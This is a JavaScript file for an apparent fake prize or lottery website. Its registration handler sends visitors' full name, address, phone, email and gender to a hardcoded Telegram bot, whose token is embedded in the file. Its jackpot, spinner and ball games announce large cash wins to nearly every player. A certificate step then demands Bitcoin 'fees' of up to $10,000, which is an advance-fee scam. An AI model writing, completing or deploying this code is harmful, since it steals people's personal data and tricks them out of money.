const TELEGRAM_BOT_TOKEN = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";  // Replace this with your actual chat ID
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

document.getElementById('registrationForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const formData = new FormData(e.target);
    const registrationData = {};
    formData.forEach((value, key) => {
        registrationData[key] = value;
    });

    // Save registration data to local storage
    localStorage.setItem('registrationData', JSON.stringify(registrationData));

    const message = `New Registration:\nFull Name: ${registrationData.fullName}\nAddress: ${registrationData.address}\nPhone: ${registrationData.phone}\nEmail: ${registrationData.email}\nGender: ${registrationData.gender}`;

    fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        })
    }).then(response => response.json()).then(data => {
        if (data.ok) {
            document.getElementById('registration').style.display = 'none';
            document.getElementById('gameSelection').style.display = 'block';
        } else {
            alert('Registration failed. Please try again.');
        }
    }).catch(error => {
        console.error('Error:', error);
        alert('Registration failed. Please try again.');
    });
});

const prizes = [
    { amount: '$50,000.00', fee: '$650' },
    { amount: '$100,000.00', fee: '$1000' },
    { amount: '$125,000.00', fee: '$1250' },
    { amount: '$150,000.00', fee: '$1500' },
    { amount: '$175,000.00', fee: '$1750' },
    { amount: '$200,000.00', fee: '$2000' },
    { amount: '$250,000.00', fee: '$2500' },
    { amount: '$300,000.00', fee: '$3000' },
    { amount: '$450,000.00', fee: '$4500' },
    { amount: '$500,000.00', fee: '$5000' },
    { amount: '$600,000.00', fee: '$6000' },
    { amount: '$800,000.00', fee: '$8000' },
    { amount: '$850,000.00', fee: '$8500' },
    { amount: '$900,000.00', fee: '$9000' },
    { amount: '$1,000,000.00', fee: '$10000' }
];

let attempts = 0;

// Jackpot Game Logic
if (document.getElementById('playJackpot')) {
    document.getElementById('playJackpot').addEventListener('click', function() {
        attempts++;
        if (attempts <= 3) {
            const prize = prizes[Math.floor(Math.random() * prizes.length)];
            document.getElementById('jackpotResult').innerText = `You won ${prize.amount}!`;
            showCertificate(prize);
        } else {
            attempts = 0;
            document.getElementById('jackpotResult').innerText = 'Try again!';
        }
    });
}

// Spinning Board Game Logic
if (document.getElementById('spinButton')) {
    document.getElementById('spinButton').addEventListener('click', function() {
        const spinner = document.getElementById('spinner');
        spinner.style.animation = "spin 2s linear infinite";

        setTimeout(() => {
            spinner.style.animation = "";
            const prize = prizes[Math.floor(Math.random() * prizes.length)];
            document.getElementById('spinningResult').innerText = `You won ${prize.amount}!`;
            showCertificate(prize);
        }, 2000);
    });
}

// Ball Scratch Game Logic
if (document.getElementById('ballContainer')) {
    const ballContainer = document.getElementById('ballContainer');
    prizes.forEach((prize, index) => {
        const ball = document.createElement('div');
        ball.className = 'ball';
        ball.innerText = index + 1;
        ball.addEventListener('click', function() {
            document.getElementById('ballScratchResult').innerText = `You won ${prize.amount}!`;
            showCertificate(prize);
        });
        ballContainer.appendChild(ball);
    });
}

function showCertificate(prize) {
    const registrationData = getRegistrationData();
    document.getElementById('certificateText').innerText = `Congratulations ${registrationData.fullName}! You won ${prize.amount}.`;
    document.getElementById('paymentAmount').innerText = prize.fee;
    document.getElementById('game').style.display = 'none';
    document.getElementById('certificate').style.display = 'block';
}

function getRegistrationData() {
    return JSON.parse(localStorage.getItem('registrationData'));
}

if (document.getElementById('downloadCertificate')) {
    document.getElementById('downloadCertificate').addEventListener('click', function() {
        const certificateText = document.getElementById('certificateText').innerText;
        const blob = new Blob([certificateText], { type: 'text/plain' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = 'certificate.txt';
        link.click();
    });
}

if (document.getElementById('payBitcoin')) {
    document.getElementById('payBitcoin').addEventListener('click', function() {
        window.location.href = `bitcoin_payment.html?amount=${document.getElementById('paymentAmount').innerText}`;
    });
}

if (document.getElementById('bitcoinPaymentForm')) {
    document.addEventListener('DOMContentLoaded', function() {
        const urlParams = new URLSearchParams(window.location.search);
        const amount = urlParams.get('amount');
        if (document.getElementById('amount')) {
            document.getElementById('amount').value = amount;
        }
    });

    document.getElementById('bitcoinPaymentForm').addEventListener('submit', function(e) {
        e.preventDefault();

        const paymentData = new FormData(e.target);
        const paymentInfo = {};
        paymentData.forEach((value, key) => {
            paymentInfo[key] = value;
        });

        alert(`Payment of ${paymentInfo.amount} BTC sent to ${paymentInfo.wallet}. Thank you!`);
    });
}
